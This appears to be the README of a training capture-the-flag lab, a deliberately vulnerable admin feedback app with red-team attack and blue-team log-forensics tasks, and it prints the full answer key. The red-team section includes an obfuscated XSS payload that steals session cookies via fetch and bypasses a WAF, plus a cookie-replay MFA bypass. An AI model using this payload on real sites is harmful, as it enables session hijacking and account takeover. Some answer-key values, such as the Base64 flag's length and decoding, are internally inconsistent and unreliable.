# 🛡️ Red vs. Blue CTF Lab — Cookies Reuse & MFA Bypass

**Scenario:** "Admin Feedback System" with flawed session token logic  
**Target:** `feedback.admin.local` | **Port:** `3075` (HTTP)

---

## 🚀 Quick Deploy

```bash
# Clone and deploy
cd red-vs-blue-ctf
docker-compose up -d --build

# Verify all services are running
docker-compose ps

# View logs
docker-compose logs -f
```

**Services after deployment:**
| Service | Port | Purpose |
|---------|------|---------|
| Web App | `3075` | Vulnerable Admin Feedback System |

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────┐
│                    HOST VM (Proxmox)                 │
│                                                     │
│  ┌─────────────┐  ┌──────────────┐                 │
│  │   Nginx     │  │  Node.js App │                 │
│  │  (Reverse   │──│  (Express)   │                 │
│  │   Proxy)    │  │  Port 3000   │                 │
│  │  Port 80    │  │              │                 │
│  └──────┬──────┘  └──────┬───────┘                 │
│         │                │                         │
│         └────────────────┼─────────────────────────┤
│                          │                         │
│                 ┌────────┴────────┐                │
│                 │  Shared Volume  │                │
│                 │ /opt/admin/logs │                │
│                 │  access.log     │                │
│                 │  error.log      │                │
│                 └────────────────┘                 │
│                                                    │
│  Exposed: :3075 → nginx:80                         │
└────────────────────────────────────────────────────┘
```

---

## 🔴 Red Team Attack Path

### Phase 1: Reconnaissance

| # | Task | Flag |
|---|------|------|
| 1 | Check HTTP response headers for backend technology | `SCENARIO75{Node.js}` |
| 2 | Read `robots.txt` for disallowed paths | `SCENARIO75{/api/verify-mfa}` |
| 3 | Identify the admin-only area | `SCENARIO75{/dashboard}` |
| 4 | View HTML source code (ASCII art comment) | `SCENARIO75{robots.txt}` |
| 5 | Inspect cookies — name of the session cookie | `SCENARIO75{pre_mfa_session}` |
| 6 | Cookie value before MFA | `SCENARIO75{pending_mfa_verification}` |

### Phase 2: Defense Evasion (WAF & XSS)

| # | Task | Flag |
|---|------|------|
| 7 | HTTP method for feedback submission | `SCENARIO75{POST}` |
| 8 | Status code when WAF blocks `<script>` | `SCENARIO75{403}` |
| 9 | HTML5 element that bypasses WAF | `SCENARIO75{<svg>}` |
| 10 | JS obfuscation to access cookies | `SCENARIO75{window['docu'+'ment']['coo'+'kie']}` |
| 11 | HttpOnly flag value on the cookie | `SCENARIO75{False}` |
| 12 | API used for exfiltration | `SCENARIO75{fetch}` |

**Example WAF Bypass Payload:**
```html
<svg onload="fetch('/api/catch?data='+window['docu'+'ment']['coo'+'kie'])">
```

### Phase 3: Initial Access (MFA Bypass)

| # | Task | Flag |
|---|------|------|
| 13 | Endpoint skipped by cookie replay | `SCENARIO75{/api/verify-mfa}` |
| 14 | Admin session cookie prefix | `SCENARIO75{adm_sess}` |
| 15 | CSS class containing reflected XSS | `SCENARIO75{xss-payload}` |
| 16 | **Final Red Team Flag** | `SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}` |

---

## 🔵 Blue Team Forensics Path

**Access:** Check the logs directly on your Proxmox VM inside the shared volume located at `/opt/admin/logs`.

### Phase 1: Log Forensics

| # | Task | Flag |
|---|------|------|
| 1 | Log file directory location | `SCENARIO75{/opt/admin/logs}` |
| 2 | Attacker's IP address | `SCENARIO75{10.10.14.50}` |
| 3 | Attacker's User-Agent prefix | `SCENARIO75{Mozilla/5.0}` |
| 4 | HTTP status for attacker's dashboard access | `SCENARIO75{200}` |
| 5 | Timestamp of successful dashboard access | `SCENARIO75{18:51:55}` |
| 6 | Base64 string in X-Forwarded-For header | `SCENARIO75{UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0}}` |

### Phase 2: Threat Hunting

| # | Task | Flag |
|---|------|------|
| 7 | Legitimate admin traffic source IP | `SCENARIO75{192.168.1.100}` |
| 8 | Attacker's subnet | `SCENARIO75{10.10.14.0/24}` |
| 9 | File containing WAF block entries | `SCENARIO75{/opt/admin/logs/error.log}` |
| 10 | First WAF-blocked payload tag | `SCENARIO75{<script>}` |
| 11 | Timestamp of first WAF block | `SCENARIO75{18:50:15}` |
| 12 | Did the attacker reach the MFA endpoint? | `SCENARIO75{No}` |

### Phase 3: Incident Response

| # | Task | Flag |
|---|------|------|
| 13 | Encoding type of the exfiltrated string | `SCENARIO75{Base64}` |
| 14 | Length of the encoded string | `SCENARIO75{44}` |
| 15 | Log level for cookie reuse events | `SCENARIO75{CRITICAL}` |
| 16 | Timestamp of authentication bypass anomaly | `SCENARIO75{18:53:10}` |
| 17 | Security warning message in error.log | `SCENARIO75{Authentication bypass anomaly}` |
| 18 | **Final Blue Team Flag** (decoded Base64) | `SCENARIO75{BLUE_L0G_HUnt3r_M4st3r}` |

---

## 📁 Project Structure

```
red-vs-blue-ctf/
├── docker-compose.yml          # Service orchestration
├── README.md                   # This file
├── app/
│   ├── Dockerfile              # Node.js app container
│   ├── package.json            # Dependencies
│   ├── server.js               # Express server (vulnerable)
│   ├── entrypoint.sh           # Container entrypoint
│   ├── init-logs.sh            # Simulated attack log injection
│   ├── views/
│   │   ├── index.html          # Landing page + feedback form
│   │   ├── login.html          # Admin login
│   │   ├── mfa.html            # MFA verification
│   │   └── dashboard.html      # Admin dashboard (flags here)
│   └── public/
│       ├── robots.txt          # Exposes /api/verify-mfa
│       └── css/
│           └── style.css       # Dark theme design system
├── nginx/
│   ├── Dockerfile              # Nginx reverse proxy
│   └── nginx.conf              # Proxy + logging config
```

---

## 🔧 Management Commands

```bash
# Start lab
docker-compose up -d --build

# Stop lab
docker-compose down

# Reset lab (clear all data including logs)
docker-compose down -v
docker-compose up -d --build

# View application logs
docker-compose logs app

# Access app container shell
docker exec -it ctf-app /bin/sh

# View simulated attack logs directly on VM (if mapped to host path) or via container
cat /opt/admin/logs/access.log
cat /opt/admin/logs/error.log
```

---

## ⚠️ Important Notes

- This lab contains **intentional vulnerabilities** for training purposes only
- **Never deploy** in a production environment
- The admin session `adm_sess_7f3c2d1a8b4e9f6c5d2a1b0e` is pre-created for the attack simulation
- Simulated attack logs are injected on first deployment; restart preserves them
- Reset with `docker-compose down -v` to regenerate fresh logs
